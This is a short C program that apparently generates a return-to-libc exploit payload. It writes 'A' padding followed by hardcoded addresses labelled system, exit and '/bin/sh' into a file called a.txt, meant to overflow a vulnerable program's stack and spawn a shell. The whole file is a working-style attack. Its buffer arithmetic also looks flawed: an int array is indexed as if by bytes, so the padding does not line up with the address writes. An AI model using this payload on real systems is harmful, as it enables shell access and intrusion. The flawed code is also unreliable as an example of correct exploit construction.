#include <stdio.h>
int main(){
    int buffer[40];
    memset(buffer, 'A', 24);

    *(long *) &buffer[24]=0xf7e54cd0;//system
    *(long *) &buffer[28]=0xf7e47ec0;//exit
    *(long *) &buffer[32]=0xffffdfc7;//bin_sh

    FILE *fp;
    fp = fopen("a.txt","w");
    fwrite(buffer, sizeof(buffer), 1, fp);
    return 0;
}
